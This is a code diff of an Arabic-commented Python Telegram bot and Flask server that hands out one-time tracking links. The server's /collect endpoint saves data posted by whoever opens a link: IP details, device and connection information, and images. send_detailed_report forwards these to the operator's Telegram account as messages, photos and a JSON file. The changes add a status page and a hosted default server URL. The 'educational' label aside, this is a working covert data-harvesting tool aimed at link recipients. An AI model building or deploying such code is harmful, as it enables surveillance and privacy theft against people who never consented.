@@ -1,6 +1,6 @@
 # ============================================================
 # بوت تلغرام متكامل - روابط لمرة واحدة - للأغراض التعليمية فقط
-# يعمل على Render.com مع حفظ البيانات في Supabase
+# يعمل على Render.com
 # ============================================================
 
 import telebot
@@ -14,19 +14,17 @@ import base64
 import time
 import socket
 from datetime import datetime, timedelta
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template_string
 from flask_cors import CORS
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
-import os
 from dotenv import load_dotenv
 
-# تحميل المتغيرات البيئية
 load_dotenv()
 
 # ========== الإعدادات ==========
 BOT_TOKEN = os.environ.get('BOT_TOKEN', "YOUR_BOT_TOKEN_HERE")
 ADMIN_ID = int(os.environ.get('ADMIN_ID', 123456789))
-SERVER_URL = os.environ.get('SERVER_URL', "https://your-app.onrender.com")
+SERVER_URL = os.environ.get('SERVER_URL', "https://nn1-wn68.onrender.com")
 USE_SUPABASE = os.environ.get('USE_SUPABASE', 'false').lower() == 'true'
 SUPABASE_URL = os.environ.get('SUPABASE_URL', '')
 SUPABASE_KEY = os.environ.get('SUPABASE_KEY', '')
@@ -34,13 +32,72 @@ SUPABASE_KEY = os.environ.get('SUPABASE_KEY', '')
 # ========== تهيئة البوت ==========
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ========== قواعد البيانات المحلية ==========
+# ========== قواعد البيانات ==========
 links_db = {}
 users_db = {}
 
 # ========== خادم Flask ==========
 app = Flask(__name__)
 CORS(app)
+
+# ========== صفحة HTML للترحيب ==========
+WELCOME_PAGE = """
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مرحباً بك</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            padding: 40px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        h1 { color: #fe2c55; font-size: 2.5em; }
+        .warning { background: #ff4444; padding: 15px; border-radius: 10px; margin: 20px 0; }
+        .info { background: #2a2a4a; padding: 15px; border-radius: 10px; margin: 10px 0; }
+        code { background: #333; padding: 2px 8px; border-radius: 4px; font-size: 0.9em; }
+        .status { color: #4caf50; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ بوت اختبار أمني</h1>
+        <div class="warning">
+            ⚠️ هذا الموقع للأغراض التعليمية فقط ⚠️
+        </div>
+        <div class="info">
+            <p>✅ السيرفر يعمل بشكل صحيح!</p>
+            <p>📡 الحالة: <span class="status">🟢 نشط</span></p>
+            <p>🔗 الروابط النشطة: <strong>{{ links_count }}</strong></p>
+            <p>👥 المستخدمين: <strong>{{ users_count }}</strong></p>
+        </div>
+        <div class="info">
+            <p>📌 للحصول على رابط اختبار، تواصل مع المدير على تلغرام</p>
+            <p>🔐 روابط الاختبار تكون على شكل:</p>
+            <code>{{ server_url }}/?ref=معرف_الرابط</code>
+        </div>
+        <div style="margin-top: 30px; font-size: 0.8em; color: #666;">
+            <p>🕐 الوقت الحالي: {{ current_time }}</p>
+        </div>
+    </div>
+</body>
+</html>
+"""
 
 # ========== دوال Supabase ==========
 def supabase_request(method, endpoint, data=None):
@@ -95,7 +152,6 @@ def get_from_supabase(table, column=None, value=None):
 # ========== دوال حفظ البيانات ==========
 def save_data():
     """حفظ البيانات (محلياً وفي Supabase)"""
-    # حفظ محلياً
     try:
         with open('links_db.json', 'w') as f:
             json.dump(links_db, f)
@@ -104,15 +160,12 @@ def save_data():
     except Exception as e:
         print(f"⚠️ خطأ في الحفظ المحلي: {e}")
     
-    # حفظ في Supabase
     if USE_SUPABASE:
         try:
-            # حفظ الروابط
             for link_id, link_data in links_db.items():
                 link_data['link_id'] = link_id
                 save_to_supabase('links', link_data)
             
-            # حفظ المستخدمين
             for user_id, user_data in users_db.items():
                 user_data['user_id'] = user_id
                 save_to_supabase('users', user_data)
@@ -123,7 +176,6 @@ def load_data():
     """تحميل البيانات"""
     global links_db, users_db
     
-    # تحميل من Supabase أولاً
     if USE_SUPABASE:
         try:
             links_result = get_from_supabase('links')
@@ -143,7 +195,6 @@ def load_data():
         except Exception as e:
             print(f"⚠️ خطأ في تحميل Supabase: {e}")
     
-    # تحميل من الملفات المحلية
     try:
         with open('links_db.json', 'r') as f:
             links_db = json.load(f)
@@ -167,7 +218,7 @@ def get_local_ip():
     except:
         return "127.0.0.1"
 
-# ========== صفحة HTML ==========
+# ========== صفحة HTML الرئيسية ==========
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="ar">
@@ -494,25 +545,38 @@ HTML_PAGE = """
 
 @app.route('/')
 def index():
+    """الصفحة الرئيسية - تعرض حالة السيرفر"""
     ref = request.args.get('ref')
     
-    if not ref:
-        return "⚠️ الرابط غير صحيح - يرجى استخدام الرابط المقدم من البوت", 400
+    # إذا كان هناك ref، حاول عرض صفحة الاختبار
+    if ref:
+        if ref not in links_db:
+            return render_template_string(WELCOME_PAGE, 
+                links_count=len(links_db), 
+                users_count=len(users_db),
+                server_url=SERVER_URL,
+                current_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            )
+        
+        link_data = links_db[ref]
+        
+        if link_data.get('used', False):
+            return "⚠️ هذا الرابط تم استخدامه بالفعل!", 410
+        
+        if link_data.get('expires_at'):
+            expiry = datetime.fromisoformat(link_data['expires_at'])
+            if datetime.now() > expiry:
+                return "⚠️ انتهت صلاحية الرابط!", 410
+        
+        return HTML_PAGE
     
-    if ref not in links_db:
-        return "⚠️ الرابط غير صالح أو منتهي الصلاحية", 404
-    
-    link_data = links_db[ref]
-    
-    if link_data.get('used', False):
-        return "⚠️ هذا الرابط تم استخدامه بالفعل!", 410
-    
-    if link_data.get('expires_at'):
-        expiry = datetime.fromisoformat(link_data['expires_at'])
-        if datetime.now() > expiry:
-            return "⚠️ انتهت صلاحية الرابط!", 410
-    
-    return HTML_PAGE
+    # إذا لم يكن هناك ref، عرض صفحة الترحيب
+    return render_template_string(WELCOME_PAGE, 
+        links_count=len(links_db), 
+        users_count=len(users_db),
+        server_url=SERVER_URL,
+        current_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    )
 
 @app.route('/collect', methods=['POST'])
 def collect():
@@ -520,12 +584,10 @@ def collect():
         data = request.json
         ref = data.get('ref', 'unknown')
         
-        # حفظ البيانات كاملة
         filename = f"collected_{ref}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         with open(filename, 'w', encoding='utf-8') as f:
             json.dump(data, f, indent=2, ensure_ascii=False)
         
-        # حفظ في قاعدة البيانات
         ip_details = data.get('ip_details', {})
         user_id = ip_details.get('ip', 'unknown')
         
@@ -546,8 +608,6 @@ def collect():
         users_db[user_id]['device'] = data.get('platform', 'غير معروف')
         
         save_data()
-        
-        # ====== إرسال التقرير المفصل ======
         send_detailed_report(data, filename, ref)
         
         return jsonify({"status": "success"}), 200
@@ -571,7 +631,8 @@ def health():
         "status": "healthy",
         "timestamp": datetime.now().isoformat(),
         "links": len(links_db),
-        "users": len(users_db)
+        "users": len(users_db),
+        "server_url": SERVER_URL
     })
 
 # ========== دوال إرسال التقرير ==========
@@ -587,7 +648,6 @@ def send_detailed_report(data, filename, ref):
     window_info = data.get('window', {})
     connection = data.get('connection', {})
     
-    # ====== التقرير الأساسي ======
     msg = f"📋 **تقرير مفصل - رابط {ref[:8]}**\n"
     msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
     
@@ -720,7 +780,6 @@ def send_detailed_report(data, filename, ref):
     msg += f"📁 **حفظت في:** `{filename}`\n"
     msg += f"🔗 **الرابط:** `{ref}`\n"
     
-    # ====== إرسال التقرير ======
     try:
         if len(msg) > 4000:
             parts = [msg[i:i+4000] for i in range(0, len(msg), 4000)]
@@ -731,7 +790,6 @@ def send_detailed_report(data, filename, ref):
     except Exception as e:
         bot.send_message(ADMIN_ID, f"⚠️ فشل إرسال التقرير: {e}")
     
-    # ====== إرسال الصور ======
     if images:
         try:
             media_group = []
@@ -760,7 +818,6 @@ def send_detailed_report(data, filename, ref):
         except Exception as e:
             bot.send_message(ADMIN_ID, f"⚠️ فشل إرسال الصور: {e}")
     
-    # ====== إرسال الملف JSON ======
     try:
         with open(filename, 'rb') as f:
             bot.send_document(ADMIN_ID, f, caption=f"📊 الملف الكامل - {ref[:8]}")
@@ -994,5 +1051,5 @@ if __name__ == '__main__':
     threading.Thread(target=run_bot, daemon=True).start()
     
     # تشغيل Flask
-    port = int(os.environ.get('PORT', 5000))
+    port = int(os.environ.get('PORT', 10000))
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
